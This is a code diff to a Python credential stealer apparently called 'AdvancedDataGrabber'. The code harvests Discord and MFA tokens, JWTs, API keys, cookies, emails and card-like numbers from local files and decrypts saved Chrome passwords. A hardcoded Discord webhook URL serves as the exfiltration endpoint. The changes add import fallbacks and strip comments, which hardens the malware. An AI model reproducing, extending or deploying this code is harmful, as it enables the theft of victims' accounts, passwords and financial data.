@@ -12,9 +12,20 @@ import zipfile
 import struct
 from datetime import datetime
 from pathlib import Path
-import win32crypt
-from Crypto.Cipher import AES
 import argparse
+
+try:
+    import win32crypt
+    from Crypto.Cipher import AES
+    HAS_CRYPTO = True
+except ImportError:
+    HAS_CRYPTO = False
+
+try:
+    import psutil
+    HAS_PSUTIL = True
+except ImportError:
+    HAS_PSUTIL = False
 
 WEBHOOK_URL = "https://discord.com/api/webhooks/1400281612800888923/fHNKZfvDpO7d-VjmHUQuEyqumi_20ue2YQQxW_oVrBcxpxxP7Lq_m6V_q2QGOSsqUsC1"
 
@@ -40,7 +51,9 @@ class AdvancedDataGrabber:
     
     def get_system_info(self):
         try:
-            import psutil
+            if not HAS_PSUTIL:
+                return {"error": "psutil no disponible"}
+            
             info = {
                 "platform": platform.platform(),
                 "system": platform.system(),
@@ -395,7 +408,6 @@ class AdvancedDataGrabber:
             }
         
         elif computer_platform == "Darwin":
-            print("MacOS no es compatible por el momento 😥")
             return {}
         
         return paths
@@ -514,28 +526,18 @@ class AdvancedDataGrabber:
                         content = f.read().decode('utf-8', errors='ignore')
                     
                     patterns = [
-                        # JSON-like patterns
                         r'([\w\-\.]+)\s*:\s*["\']([^"\'\n\r]+)["\']',
                         r'([\w\-\.]+)\s*:\s*([\w\-\.]+)',
-                        # URL patterns
                         r'(https?://[^\s"\']+)',
-                        # Token patterns
                         r'(eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+)',
                         r'([\w-]{24}\.[\w-]{6}\.[\w-]{27})',
                         r'(mfa\.[\w-]{84})',
-                        # API keys
                         r'([a-zA-Z0-9]{32,})',
-                        # Cookies-like data
                         r'([\w\-\.]+)=([^;\n\r]+)',
-                        # Base64 encoded data
                         r'([A-Za-z0-9+/=]{20,})',
-                        # Email patterns
                         r'([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})',
-                        # IP addresses
                         r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})',
-                        # Credit card-like numbers
                         r'(\d{4}[-\s]?\d{4}[-\s]?\d{4}[-\s]?\d{4})',
-                        # Phone numbers
                         r'(\+?\d{1,3}[-\s]?\(?\d{1,4}\)?[-\s]?\d{1,4}[-\s]?\d{1,9})'
                     ]
                     
@@ -563,7 +565,6 @@ class AdvancedDataGrabber:
         discord_data = {}
         
         try:
-            # Buscar tokens específicos de Discord
             discord_patterns = {
                 "token": r'["\']token["\']\s*:\s*["\']([^"\']+)["\']',
                 "id": r'["\']id["\']\s*:\s*["\']([^"\']+)["\']',
@@ -612,12 +613,12 @@ class AdvancedDataGrabber:
                             content = f.read().decode('utf-8', errors='ignore')
                         
                         token_patterns = [
-                            r'([\w-]{24}\.[\w-]{6}\.[\w-]{27})',  
-                            r'(mfa\.[\w-]{84})',  
-                            r'(eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+)',  
-                            r'([A-Za-z0-9]{64})', 
-                            r'([A-Za-z0-9]{32})',  
-                            r'([A-Za-z0-9_-]{20,})'  
+                            r'([\w-]{24}\.[\w-]{6}\.[\w-]{27})',
+                            r'(mfa\.[\w-]{84})',
+                            r'(eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+)',
+                            r'([A-Za-z0-9]{64})',
+                            r'([A-Za-z0-9]{32})',
+                            r'([A-Za-z0-9_-]{20,})'
                         ]
                         
                         for pattern in token_patterns:
@@ -720,6 +721,9 @@ class AdvancedDataGrabber:
             else:
                 if not encrypted_password:
                     return ""
+                
+                if not HAS_CRYPTO:
+                    return "[ENCRYPTED - CRYPTO NOT AVAILABLE]"
                 
                 local_state_path = None
                 if browser.lower() == "google chrome":
